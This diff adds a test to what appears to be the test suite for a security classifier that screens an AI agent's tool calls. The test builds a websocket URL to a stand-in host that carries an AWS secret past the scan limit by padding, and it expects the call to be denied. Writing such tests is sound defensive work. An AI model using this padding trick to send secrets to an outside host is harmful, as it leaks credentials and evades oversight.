@@ -223,4 +223,16 @@ describe('a PowerShell or Monitor command past the scan bound', () => {
     expect(r.classes).toEqual(expect.arrayContaining(['shell.network', 'secret.unscannable']));
     expect(r.classes).not.toContain('secret.egress');
   });
+
+  // A socket has no command for the classifier to read through, so this one costs a few
+  // milliseconds where the two above cost a second each.
+  it('is denied as unscannable when a Monitor socket carries it in its url', async () => {
+    const { pre } = fixture();
+    const lead = 'wss://collect.example/stream?pad=';
+    const url = `${lead}${'a'.repeat(MAX_SCAN_CHARS - lead.length)}${AWS_SECRET}`;
+    const r = await pre('Monitor', { description: 'watch a stream', ws: { url } });
+    expect(r.decision).toMatchObject({ effect: 'deny', ruleId: 'deny-secret-unscannable' });
+    expect(r.classes).toEqual(expect.arrayContaining(['shell.network', 'secret.unscannable']));
+    expect(r.classes).not.toContain('secret.egress');
+  });
 });
